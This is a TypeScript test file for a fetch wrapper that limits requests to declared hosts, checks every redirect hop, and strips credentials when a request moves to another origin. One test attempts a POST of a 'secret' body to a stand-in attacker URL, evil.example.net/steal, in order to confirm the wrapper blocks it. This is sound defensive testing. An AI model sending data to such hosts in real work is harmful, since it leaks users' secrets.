import { describe, expect, it } from "vitest"
import { hostCovered, hostFetch, hostProblems } from "./index.js"

interface Sent {
  url: string
  method: string
  headers: Headers
  body: unknown
}

const recorder = (answers: Record<string, () => Response>) => {
  const sent: Sent[] = []
  const send = async (input: string | URL | Request, init?: RequestInit) => {
    const url = input instanceof Request ? input.url : String(input)
    sent.push({ url, method: init?.method ?? "GET", headers: new Headers(init?.headers), body: init?.body })
    const answer = answers[url]
    if (!answer) throw new TypeError("fetch failed")
    return answer()
  }
  return { sent, send }
}

const redirect = (status: number, location: string) => () => new Response(null, { status, headers: { location } })
const ok = () => new Response("{}")

describe("hosts", () => {
  it("are lower-case hostnames; a wildcard covers only names under two labels or more", () => {
    expect(hostProblems(["api.acme.example", "*.cdn.acme.example", "localhost"])).toEqual([])
    expect(
      hostProblems(["https://acme.example", "acme.example:443", "Acme.example", "*.com", "a.*.b", "x", "x"]),
    ).toHaveLength(6)
    expect(hostCovered("img.cdn.acme.example", ["*.cdn.acme.example"])).toBe(true)
    expect(hostCovered("cdn.acme.example", ["*.cdn.acme.example"])).toBe(false)
    expect(hostCovered("API.acme.example.", ["api.acme.example"])).toBe(true)
    expect(hostCovered("evilacme.example", ["*.acme.example"])).toBe(false)
  })
})

describe("hostFetch", () => {
  it("refuses an undeclared host before anything is sent, naming the host and the field to add", async () => {
    const { sent, send } = recorder({})
    const fetch = hostFetch({ hosts: ["api.acme.example"], fetch: send })
    await expect(fetch("https://evil.example.net/steal", { method: "POST", body: "secret" })).rejects.toMatchObject({
      code: "configuration_error",
      message: expect.stringContaining('add "evil.example.net" to `hosts`'),
      details: { reason: "network.host-undeclared", sent: false },
    })
    expect(sent).toEqual([])
  })

  it("refuses a declaration that is not a list of hosts", () => {
    expect(() => hostFetch({ hosts: ["https://api.acme.example"] })).toThrow(/is not a host/)
  })

  it("follows a redirect only to a declared host, checking every hop", async () => {
    const { sent, send } = recorder({
      "https://api.acme.example/a": redirect(307, "https://evil.example.net/b"),
      "https://api.acme.example/c": redirect(302, "/d"),
      "https://api.acme.example/d": ok,
    })
    const fetch = hostFetch({ hosts: ["api.acme.example"], fetch: send })
    await expect(fetch("https://api.acme.example/a", { method: "PUT", body: "x" })).rejects.toMatchObject({
      details: { reason: "network.host-undeclared" },
    })
    expect(sent.map((one) => one.url)).toEqual(["https://api.acme.example/a"])
    expect((await fetch(new URL("https://api.acme.example/c"))).status).toBe(200)
  })

  it("turns a 303 into a GET and drops credentials on a hop to another origin", async () => {
    const { sent, send } = recorder({
      "https://api.acme.example/upload": redirect(303, "https://files.acme.example/done"),
      "https://files.acme.example/done": ok,
    })
    const fetch = hostFetch({ hosts: ["*.acme.example"], fetch: send })
    await fetch("https://api.acme.example/upload", {
      method: "POST",
      body: "data",
      headers: { authorization: "Bearer t", "x-trace": "1" },
    })
    const hop = sent[1]
    expect(hop).toMatchObject({ url: "https://files.acme.example/done", method: "GET", body: undefined })
    expect(hop?.headers.get("authorization")).toBeNull()
    expect(hop?.headers.get("x-trace")).toBe("1")
  })

  it("hands back the redirect itself when the caller asked for manual redirects", async () => {
    const { send } = recorder({ "https://api.acme.example/a": redirect(302, "https://evil.example.net/") })
    const fetch = hostFetch({ hosts: ["api.acme.example"], fetch: send })
    expect((await fetch("https://api.acme.example/a", { redirect: "manual" })).status).toBe(302)
  })

  it("names a timeout and a failed connection as CliErrors", async () => {
    const hang = (_input: string | URL | Request, init?: RequestInit) =>
      new Promise<Response>((_, reject) => init?.signal?.addEventListener("abort", () => reject(init.signal?.reason)))
    await expect(
      hostFetch({ hosts: ["api.acme.example"], fetch: hang, timeoutMs: 1 })("https://api.acme.example/"),
    ).rejects.toMatchObject({ code: "timeout" })
    const { send } = recorder({})
    await expect(
      hostFetch({ hosts: ["api.acme.example"], fetch: send })("https://api.acme.example/"),
    ).rejects.toMatchObject({ code: "network_error" })
  })
})
